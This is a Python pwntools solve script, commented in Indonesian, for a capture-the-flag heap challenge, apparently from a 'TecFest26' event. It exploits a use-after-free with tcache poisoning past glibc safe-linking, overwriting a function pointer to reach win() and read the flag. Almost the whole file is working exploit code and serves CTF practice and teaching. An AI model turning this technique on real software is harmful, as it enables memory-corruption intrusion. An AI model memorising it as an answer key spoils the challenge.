#!/usr/bin/env python3
"""solve.py -- pwn_columbina v2 (tcache poisoning, bypass safe-linking)

Teknik (lihat NOTES.md untuk detail penuh & kenapa butuh 3 fragmen, bukan 2):
  1. Catat fragmen slot 0 (A, sacrificial #1) + slot 1 (B, TARGET -- tetap
     hidup sepanjang exploit) + slot 2 (C, sacrificial #2) -> leak alamat
     heap ketiganya ("bersemayam di %p").
  2. Lepas A, lalu lepas C (urutan penting -- C jadi HEAD tcache karena
     dibebaskan TERAKHIR, LIFO): entries=A (count=1) -> entries=C,
     C.next=mangle(C,A) (count=2).
  3. UAF-WRITE: "ukir ulang nama" slot 2 (C, SUDAH dilepas!) dengan 8 byte =
     PROTECT_PTR(C_addr, target) = (C_addr>>12) XOR target, dengan
     target = &B->otoritas (addr B + 32). Korupsi field `next` chunk C
     SEBELUM dia di-pop ulang.
  4. "Tulis entri Luonnotar" #1, panjang=0 -> malloc(0x28) pop C (count 2->1,
     count masih >0 jadi tcache fast-path tetap dipakai) -> entries jadi
     REVEAL_PTR(C.next) = target (matematika safe-linking: (C>>12) XOR
     [(C>>12) XOR target] = target). Konsumsi C, tidak nulis apa-apa.
  5. "Tulis entri Luonnotar" #2, panjang=8 -> malloc(0x28) CEK count=1>0 (INI
     SEBABNYA BUTUH 2 CHUNK SACRIFICIAL, bukan 1 -- kalau cuma 1 chunk yang
     dibebaskan, count sudah 0 setelah langkah 4 dan tcache fast-path di-skip
     total, entries[] yang sudah diracun jadi tidak pernah dibaca) -> pop
     `target` (tcache beneran balikin alamat ARBITRARY ini sebagai "chunk")
     -> tulis 8 byte alamat win() -> landing TEPAT di field `otoritas`
     fragmen slot 1 (B).
  6. "Uji otoritas" slot 1 -> fragmen[1]->otoritas(fragmen[1]) == win() ->
     flag.

Jalankan:
  python3 solve.py                              # test lokal (ld+libc dari bin/)
  python3 solve.py REMOTE=1 HOST=127.0.0.1 PORT=40501
"""
import os
from pwn import *
import addrs  # auto-generated oleh deploy_pwn.sh (nm SEBELUM strip) -- JANGAN edit manual

BIN_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bin")

context.arch = "amd64"
exe = ELF(os.path.join(BIN_DIR, "columbina"), checksec=False)
context.binary = exe

if args.REMOTE:
    io = remote(args.HOST or "127.0.0.1", int(args.PORT or 40501))
else:
    # glibc yang DIPIN (2.35, Ubuntu 22.04), BUKAN glibc sistem host -- heap
    # exploitation sensitif ke ukuran/metadata chunk tcache (lihat NOTES.md).
    io = process(
        [
            os.path.join(BIN_DIR, "ld-linux-x86-64.so.2"),
            "--library-path", BIN_DIR,
            os.path.join(BIN_DIR, "columbina"),
        ],
        cwd=BIN_DIR,
    )

OTORITAS_OFFSET = 32  # offsetof(struct eksistensi, otoritas)
win_addr = addrs.ADDR_WIN


def menu_choice(n):
    io.sendlineafter(b"> ", str(n).encode())


def create(slot, name):
    menu_choice(1)
    io.sendlineafter(b"slot: ", str(slot).encode())
    io.sendlineafter(b"nama: ", name)
    io.recvuntil(b"bersemayam di ")
    return int(io.recvline().strip(), 16)


# 1. Catat A (sacrificial #1, slot 0), B (TARGET, slot 1), C (sacrificial
#    #2, slot 2) -> leak ketiga alamat heap-nya.
addr_a = create(0, b"A")
addr_b = create(1, b"B")
addr_c = create(2, b"C")
log.info(f"A @ {hex(addr_a)}  B(target vessel) @ {hex(addr_b)}  C @ {hex(addr_c)}")

target = addr_b + OTORITAS_OFFSET
log.info(f"target (&B->otoritas) = {hex(target)}")

# 2. Lepas A dulu, LALU C (C jadi head tcache -- LIFO, count jadi 2).
menu_choice(2)
io.sendlineafter(b"slot: ", b"0")
menu_choice(2)
io.sendlineafter(b"slot: ", b"2")

# 3. UAF-WRITE: ukir ulang nama slot 2 (C, SUDAH di-free) -> korupsi field
#    `next` (fd) chunk C via formula safe-linking (PROTECT_PTR).
mangled = (addr_c >> 12) ^ target
menu_choice(3)
io.sendlineafter(b"slot: ", b"2")
io.recvuntil(b"raw): ")
io.send(p64(mangled) + b"\x00" * 16)  # 24 byte field nama, 8 byte pertama = fd palsu

# 4. Tulis entri Luonnotar #1, panjang=0 -> konsumsi chunk C dari tcache
#    (count 2->1, entries jadi REVEAL_PTR(C.next) == target).
menu_choice(5)
io.sendlineafter(b"bebas): ", b"0")
io.sendlineafter(b"(0-16): ", b"0")

# 5. Tulis entri Luonnotar #2, panjang=8 -> count masih 1 (>0) jadi tcache
#    fast-path tetap dipakai -> malloc mengembalikan `target` sebagai
#    "chunk" -> 8 byte kita landing TEPAT di B->otoritas.
menu_choice(5)
io.sendlineafter(b"bebas): ", b"0")
io.sendlineafter(b"(0-16): ", b"8")
io.recvuntil(b"raw): ")
io.send(p64(win_addr))

# 6. Uji otoritas slot 1 -> fragmen[1]->otoritas(fragmen[1]) == win().
menu_choice(4)
io.sendlineafter(b"slot: ", b"1")

flag = io.recvline_contains(b"TecFest26", timeout=5)
print(flag.decode().strip())
io.close()
